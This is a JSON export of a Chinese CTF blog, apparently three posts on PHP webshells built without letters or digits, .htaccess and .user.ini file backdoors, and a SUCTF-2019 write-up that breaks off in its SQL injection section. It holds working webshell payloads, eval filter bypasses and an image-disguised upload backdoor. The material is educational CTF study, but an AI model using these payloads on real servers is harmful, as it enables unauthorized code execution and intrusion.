class=\"comment\">//_POST</span></span><br><span class=\"line\">$___=<span class=\"string\">\"俯\"</span>;$_____.=~($___&#123;$__&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"瞰\"</span>;$_____.=~($___&#123;$__&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"次\"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"站\"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$_=$$_____; <span class=\"comment\">//$_POSTT</span></span><br><span class=\"line\"></span><br><span class=\"line\">$____($_[$__]);<span class=\"comment\">//assert(_POST[2])</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"字符递增\"><a href=\"#字符递增\" class=\"headerlink\" title=\"字符递增\"></a>字符递增</h3><blockquote>\n<p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 $a = ‘Z’; $a++; 将把 $a 变成’AA’，而在 C 中，a = ‘Z’; a++; 将把 a 变成 ‘[‘（’Z’ 的 ASCII 值是 90，’[‘ 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。 </p>\n</blockquote>\n<pre><code>echo &quot;&lt;h3&gt;Postincrement&lt;/h3&gt;&quot;;\n$a = 5;\necho &quot;Should be 5: &quot; . $a++ . &quot;&lt;br /&gt;\\n&quot;; //5\necho &quot;Should be 6: &quot; . $a . &quot;&lt;br /&gt;\\n&quot;;   //6\n$c = &apos;b&apos;;\necho $c++.&quot;&lt;br /&gt;\\n&quot;;                     //b\necho $c.&quot;\\n&quot;;                               //c\n?&gt;</code></pre><p>我们只要拿到一个变量值为 <code>a</code> ，通过自增操作就可以获得 <code>a-z</code> 中所有字符。</p>\n<p>php中如果强制链接数组和字符串的话，数组会被转换成字符串，值为 <code>Arrary</code> </p>\n<pre><code>echo &apos;&apos;.[];   //Array</code></pre><p>我们取第一个字符就可以得到 <code>A</code> 了。</p>\n<p>payload:</p>\n<pre><code>&lt;?php\n$_=[];\n$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;\n$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____=&apos;_&apos;;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);</code></pre><p>但是一直没有成功</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = <span class=\"string\">'$_=[];$_=@\"$_\";'</span></span><br><span class=\"line\">b = <span class=\"string\">\"$_=$_['!'=='@'];\"</span></span><br><span class=\"line\">c = <span class=\"string\">'$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class=\"line\">d = <span class=\"string\">'$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;'</span></span><br><span class=\"line\">e = <span class=\"string\">'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class=\"line\">f = <span class=\"string\">'$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class=\"line\">g = <span class=\"string\">\"$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;\"</span></span><br><span class=\"line\">h = <span class=\"string\">'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_=$$____;$___($_[_]);'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> (a+b+c+d+e+f+g+h).replace(<span class=\"string\">\"$\"</span>,<span class=\"string\">\"%24\"</span>).replace(<span class=\"string\">\"=\"</span>,<span class=\"string\">\"%3d\"</span>).replace(<span class=\"string\">\";\"</span>,<span class=\"string\">\"%3b\"</span>).replace(<span class=\"string\">\"@\"</span>,<span class=\"string\">\"%40\"</span>).replace(<span class=\"string\">\"+\"</span>,<span class=\"string\">\"%20\"</span>).replace(<span class=\"string\">\"[\"</span>,<span class=\"string\">\"%5b\"</span>).replace(<span class=\"string\">\"]\"</span>,<span class=\"string\">\"%5d\"</span>).replace(<span class=\"string\">\"'\"</span>,<span class=\"string\">\"%27\"</span>).replace(<span class=\"string\">'\"'</span>,<span class=\"string\">\"%22\"</span>).replace(<span class=\"string\">\"!\"</span>,<span class=\"string\">\"%21\"</span>).replace(<span class=\"string\">\"(\"</span>,<span class=\"string\">\"%28\"</span>).replace(<span class=\"string\">\")\"</span>,<span class=\"string\">\"%29\"</span>).replace(<span class=\"string\">\".\"</span>,<span class=\"string\">'%2e'</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"限制长度\"><a href=\"#限制长度\" class=\"headerlink\" title=\"限制长度\"></a>限制长度</h2><p>PHP可以将字符串当作函数来处理：</p>\n<pre><code>function B()\n{\n    echo &quot;hello world!&quot;;\n}\n\n$_++;           //1\necho $_;\n$__ = &apos;?&apos;^&apos;}&apos;; //B\necho $__;\n$__();</code></pre><p>题目：</p>\n<pre><code>&lt;?php\ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;40){\n        die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>限制长度为40，之前的异或不行了。我们要利用PHP允许动态执行函数的特点，构造一个 <code>_GET</code> 来去读取 <code>getFlag()</code> </p>\n<p>可以通过连续调用异或来获得 <code>_GET</code> </p>\n<pre><code>&lt;?php\n    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET\n?&gt;</code></pre><p>通过构造 <code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code> 来获取参数</p>\n<p>最后传入参数 getFlag</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag </code></pre><p>后面的 <code>__</code> 我们不传值默认为 <code>NULL</code> 也就相当于 <code>getFlag()</code></p>\n<p>事实上下面这也可以：</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_]();&amp;_=getFlag</code></pre><h3 id=\"扩展\"><a href=\"#扩展\" class=\"headerlink\" title=\"扩展\"></a>扩展</h3><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</code></pre><p>对 <code>getFlag</code> 进行取反然后 <code>URL</code> 编码</p>\n<pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>这个在{}中进行取反 <code>${~&quot;\\xa0\\xb8\\xba\\xab&quot;}</code> ，相当于 <code>$_GET</code>，拼接出了 <code>$_GET[&#39;+&#39;]&amp;#40; &amp;#41;;</code>，传入 <code>+=getFlag()</code> 从而执行了函数`</p>\n<h2 id=\"不用数字字母和下划线\"><a href=\"#不用数字字母和下划线\" class=\"headerlink\" title=\"不用数字字母和下划线\"></a>不用数字字母和下划线</h2><p>题目：</p>\n<pre><code>&lt;?php\n\ninclude &apos;flag.php&apos;;\n\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;50){\n        die(&quot;Too Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){\n        die(&quot;Not Allowed.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;  </code></pre><p>通过上面的取反就可以了</p>\n<pre><code>?code=$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;[%27%2d%27]();&amp;%2d=getFlag //$_GET(&apos;-&apos;)();&amp;-=getFlag;\n\n$c = &quot;_GET&quot;;\necho urlencode(~($c)); //%A0%B8%BA%AB</code></pre><p>这里利用 <code>${}</code> 中的代码可以执行的特点，在 <code>{}</code> 里进行取反操作，其实也就是可变变量</p>\n<pre><code>&lt;?php\n    $a = &apos;hello&apos;;\n    $$a = &apos;world&apos;;\n    echo &quot;$a ${$a}&quot;;\n?&gt;\n\n输出：hello world</code></pre><p>这里的 <code>$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;</code> 相当于 <code>$_GET</code> .</p>\n<p>还有更骚的，用中文：</p>\n<pre><code>code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();  //%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27=getFlag</code></pre><p>相当于直接给变量赋值了，这样就不用 <code>{}</code> 了</p>\n<h2 id=\"不用数字、字母、-、\"><a href=\"#不用数字、字母、-、\" class=\"headerlink\" title=\"不用数字、字母、_、$\"></a>不用数字、字母、_、$</h2><pre><code>&lt;?php \ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;]))\n{\n    $code=$_GET[&apos;code&apos;];\n    if(strlen($code)&gt;35){\n    die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))\n    {\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}\nelse\n{\n    highlight_file(__FILE__);\n}\n//$hint=&quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p>\n<p><code>?&gt;</code> 闭合php文件开头的 <code>&lt;?php</code> , <code>&lt;?</code> 相当于 <code>&lt;? echo</code> .</p>\n<p>在配置文件中开启 <code>short_open_tag</code> 后可以使用短标签。默认是开启的。</p>\n<h2 id=\"another-test\"><a href=\"#another-test\" class=\"headerlink\" title=\"another test\"></a>another test</h2><pre><code>&lt;?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET[&apos;_&apos;];\nif ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $_) )\n    die(&apos;rosé will not do it&apos;);\n\nif ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )\n    die(&apos;you are so close, omg&apos;);\n\neval($_);\n?&gt;</code></pre><p>主要是记录一下大佬的检测可用函数的脚本：</p>\n<pre><code>&lt;?php \n$arr = get_defined_functions()[&apos;internal&apos;];\n\nforeach ($arr as $key =&gt; $value) {\n    if ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $value) ){\n        unset($arr[$key]);\n        continue;\n    }\n\n    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){\n        unset($arr[$key]);\n        continue;\n    }\n}\n\nvar_dump($arr);\n?&gt;</code></pre><h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>\n<p><a href=\"https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/\" target=\"_blank\" rel=\"noopener\">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5677#toc-3\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5677#toc-3</a></p>\n</blockquote>\n","text":"特殊的webshell实验环境 ：php 5.45+nts+apachephp5中assert是一个函数，我们可以通过$f=&#39;assert&#39;;$f(...);这样的方法来动态执行任意代码。但 php7中，assert不再是函数，变成了一个语言结构（类似eval），","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"两种构成文件后门的方法","slug":"两种构成文件后门的方法","date":"2019-09-18T01:19:34.000Z","updated":"2019-09-25T12:07:29.143Z","comments":true,"path":"api/articles/两种构成文件后门的方法.json","excerpt":"","keywords":null,"cover":"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png","content":"<h1 id=\"两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini\"><a href=\"#两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini\" class=\"headerlink\" title=\"两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini\"></a>两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini</h1><h2 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h2><p>以下部分摘取于P神的博客<a href=\"http://www.vuln.cn/6001\" title=\"P神博客\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n<h3 id=\"user-ini-是什么？\"><a href=\"#user-ini-是什么？\" class=\"headerlink\" title=\".user.ini 是什么？\"></a>.user.ini 是什么？</h3><p>只要是以fastcgi运行的php都可以用<code>.user.ini</code>构成文件后门的方法。相比于<code>.htaccess</code>有更大的利用空间。 </p>\n<p>我们从php手册可以看到php.ini是php默认的配置文件，这里是配置选项列表<a href=\"https://www.php.net/manual/zh/ini.list.php\" title=\"配置项列表\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/ini.list.php</a>  从表中我们可以看到有 <code>PHP_INI_PERDIR</code>、<code>PHP_INI_SYSTEM</code>    、<code>PHP_INI_USER</code>、<code>PHP_INI_ALL</code> 四种模式，那么这四种有什么区别呢？  </p>\n<pre><code>模式                含义\nPHP_INI_USER    可在用户脚本（例如 ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定\nPHP_INI_PERDIR    可在 php.ini，.htaccess 或 httpd.conf 中设定\nPHP_INI_SYSTEM    可在 php.ini 或 httpd.conf 中设定\nPHP_INI_ALL        可在任何地方设定</code></pre><p>这里提到了我们可以自己设置的模式有 <code>PHP_INI_USER</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>。 在这里我们看到了 <code>.user.ini</code> 。翻阅手册<a href=\"https://www.php.net/manual/zh/configuration.file.per-user.php\" title=\"手册\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/configuration.file.per-user.php</a>可知：</p>\n<blockquote>\n<p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</p>\n<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>\n<p>在 .user.ini 风格的 INI 文件中只有具有 <strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置可被识别。</p>\n<p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p>\n<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p>\n<p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>\n</blockquote>\n<p>同时与php.ini不同的是.user.ini是一个能动态加载的配置文件，修改文件内容之后不需要重启中间件只需要等待  <code>user_ini.cache_ttl</code> 时间即可被加载。</p>\n<p>也就是说 <code>.user.ini</code> 其实就是一个我们可以自定义php配置的文件。</p>\n<h3 id=\"如何利用？\"><a href=\"#如何利用？\" class=\"headerlink\" title=\"如何利用？\"></a>如何利用？</h3><p>从php配置列表里我们发现无法配置一些关键的配置，但是在构成文件后门时我们找到了两个我们可以自己配置的选项：</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png\" alt></p>\n<p><strong>auto_prepend_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-prepending.</p>\n</blockquote>\n<p>指定一个文件在主文件之前自动解析，这个被包含的文件相当于在主文件之前调用了 <code>require</code> 函数，路径受到<code>include_path</code> 限制。 <code>include_path</code> 会指定 <em>require, include, fopen(), file(), readfile() and file_get_contents()</em> 这些函数执行时去哪寻找文件。</p>\n<p><strong>auto_append_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-appending.</p>\n<p>Note: If the script is terminated with exit(), auto-append will not occur.</p>\n</blockquote>\n<p>我们利用的重点是第一个配置，同时我们从文档也可以看出在利用时我们需要一个<strong>正常</strong>的php文件来包含我们的webshell，*<em>也就是说我们只有在文件夹里有可以正常解析(使用fastcgi模式解析)的php文件时才能这样利用。<br>*</em><br>使用时也简单直接写在<code>.user.ini</code>中</p>\n<pre><code>auto_prepend_file=webshell.jpg</code></pre><h3 id=\"效果如何？\"><a href=\"#效果如何？\" class=\"headerlink\" title=\"效果如何？\"></a>效果如何？</h3><p>环境win10+php-5.45-nts+Nginx</p>\n<p>结果如下：</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1g7c0otmfxdj313c0f476s.jpg\" alt=\"效果如图\"></p>\n<h2 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h2><h3 id=\"htaccess是什么？\"><a href=\"#htaccess是什么？\" class=\"headerlink\" title=\".htaccess是什么？\"></a>.htaccess是什么？</h3><p>翻阅apaceh官方文档<a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a>可知</p>\n<blockquote>\n<p>.htaccess files provide a way to make configuration changes on a per-directory basis.</p>\n</blockquote>\n<p><code>.htaccess</code> 文件提供了一种目录级别的修改配置的方式。一个文件，包含一条或多条配置指令，放置于目录下，这些配置指令对当前目录和其所有子目录生效。</p>\n<h3 id=\"SetHandler\"><a href=\"#SetHandler\" class=\"headerlink\" title=\"SetHandler\"></a>SetHandler</h3><p>我们在 <code>.htaccess</code> 文件中可以通过增加 <code>handler-name</code> 来配置文件的解析方式。比如你有一个目录，你想让它被 <code>imagemap rule files</code> 解析，你可以在在 <code>.htaccess</code> 文件中加入这段代码：</p>\n<pre><code>SetHandler imap-file</code></pre><p>同样的，<code>AddType</code> 可指示文件管理系统对给出的文件名以选定的文件类型进行解析。</p>\n<pre><code>AddType image/gif .gif</code></pre><p>同时，我们也可以在以 <code>php</code> 作为 <code>Apacec module</code> 时，通过 <code>php_value</code> 来配置PHP的配置选项：</p>\n<pre><code>php_value name value</code></pre><p>设置指定的值. 只适合于 PHP_INI_ALL 和 PHP_INI_PERDIR 类型指令</p>\n<h3 id=\"如何利用？-1\"><a href=\"#如何利用？-1\" class=\"headerlink\" title=\"如何利用？\"></a>如何利用？</h3><p><strong>文件解析上传漏洞</strong></p>\n<p>.htaccess文件中定义了将上传的文件后缀名为 .jpg 格式的文件以 php 格式来解析文件。.htaccess 是apache服务器中的一个配置文件，不是上传的文件的黑名单之内，所以该类型文件可以上传成功。</p>\n<pre><code>AddType  application/x-httpd-php  .jpg</code></pre><p>还可以这样：</p>\n<pre><code># FileMatch 参数即为文件名的正则匹配\n&lt;FilesMatch &quot;sniperoj&quot;&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n\n// sniperoj\n&lt;?php eval($_GET[&apos;c&apos;]);?&gt;</code></pre><p><strong>文件包含</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file /etc/hosts</code></pre><p><strong>PHP 代码执行</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file .htaccess\n#&lt;?php phpinfo();</code></pre><h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><blockquote>\n<p><a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p>\n<p><a href=\"http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html\" target=\"_blank\" rel=\"noopener\">http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/core.html#sethandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/core.html#sethandler</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler</a></p>\n<p><a href=\"https://www.php.net/manual/en/configuration.changes.php\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/en/configuration.changes.php</a></p>\n<p><a href=\"https://www.cnblogs.com/xia0zhiwei/p/4713438.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/xia0zhiwei/p/4713438.html</a></p>\n<p><a href=\"http://www.vuln.cn/6001\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n</blockquote>\n","text":"两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini.user.ini以下部分摘取于P神的博客http://www.vuln.cn/6001.user.ini 是什么？只要是以fastcgi运行的php都可以用.user.ini构成文件后门的方法。","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"SUCTF-2019","slug":"suctf-2019-WP","date":"2019-09-10T10:15:38.000Z","updated":"2019-09-11T14:54:46.974Z","comments":true,"path":"api/articles/suctf-2019-WP.json","excerpt":"","keywords":null,"cover":"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png","content":"<h1 id=\"SUCTF-2019-WP\"><a href=\"#SUCTF-2019-WP\" class=\"headerlink\" title=\"SUCTF-2019 WP\"></a>SUCTF-2019 WP</h1><p>9/10/2019 6:15:38 PM </p>\n<h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>先上传一个 <code>websell.php</code>，显示后缀不合法(改<code>php5</code>、<code>php4</code>、<code>content-type</code>这些都不行)。</p>\n<p>再上传一个图片马发现显示 <code>&amp;lt;? in contents!</code> ，就是说<code>&lt; ?</code>不能连续存在。</p>\n<p>我们通过<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>来绕过对<code>&lt;?</code>的检测。这次我们得到回显<br>    exif_imagetype:not image!</p>\n<p><code>exif_imagetype</code>用来判断图片类型，他读取一个图像的第一个字节并检查其签名。只要我们添加一个图片头就可以绕过，比如添加<code>GIF89a</code>.在添加完之后我们上传成功，此时的文件目录下除了我们上传的<code>webshell</code>还有一个<code>index.php</code>.</p>\n<h3 id=\"user-ini-文件构成的后门\"><a href=\"#user-ini-文件构成的后门\" class=\"headerlink\" title=\".user.ini 文件构成的后门\"></a>.user.ini 文件构成的后门</h3><p>详情看p神这篇文章<a href=\"http://www.vuln.cn/6001\" title=\"点这里\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n<blockquote>\n<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>\n</blockquote>\n<blockquote>\n<p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>\n</blockquote>\n<p><code>.user.ini</code>类似一个用户自定义的<code>php.ini</code>。我们能够自定义的设置是”<code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_USER</code>“的设置。（上面表格中没有提到的<code>PHP_INI_PERDIR</code>也可以在<code>.user.ini</code>中设置）</p>\n<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括<code>PHP_INI_ALL</code>）都是可以通过<code>.user.ini</code>来设置的。</p>\n<p>和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png\" alt=\"php中两个配置\"></p>\n<p><code>auto_prepend_file</code> 意味这是在php脚本执行前会执行这个参数设置的脚本，类似于在文件前调用<code>require()</code>然后这个参数的脚本所在目录受<code>include_path</code>限制<br><code>append</code>是在<code>php</code>脚本执行后才执行的，但是要注意的是遇到<code>exit()</code>的时候，这个脚本也不能运行</p>\n<p>使用的时候直接写在<code>.user.ini</code>中</p>\n<pre><code>auto_prepend_file=webshell.gif</code></pre><p>webshell.gif是要包含的文件.所以我们可以借助这个配置项来让所有的php文件都“自动”包含这个文件。👍</p>\n<p>某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。</p>\n<p>.htaccess文件构成的后门看这里：<a href=\"https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet\" title=\".htaccess\">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a>这个只能用于Apache</p>\n<p>看到这里我们发现当前目录下确实有<code>index.php</code>可以利用，于是我们开始吧🎈</p>\n<h3 id=\"开始上传\"><a href=\"#开始上传\" class=\"headerlink\" title=\"开始上传\"></a>开始上传</h3><p>我们先构造<code>.user.ini</code>文件</p>\n<pre><code>GIF89a\nauto_prepend_file=CK.jpg</code></pre><p>然后将其上传</p>\n<p>接着构造图片马<code>CK.jpg</code></p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    system(&apos;cat /flag&apos;);\n&lt;/script&gt;</code></pre><p>成功上传之后我们访问上传后的页面即可看到flag。</p>\n<h2 id=\"easy-sql\"><a href=\"#easy-sql\" class=\"headerlink\" title=\"easy sql\"></a>easy sql</h2><p>存在堆叠注入，测试<code>1;show 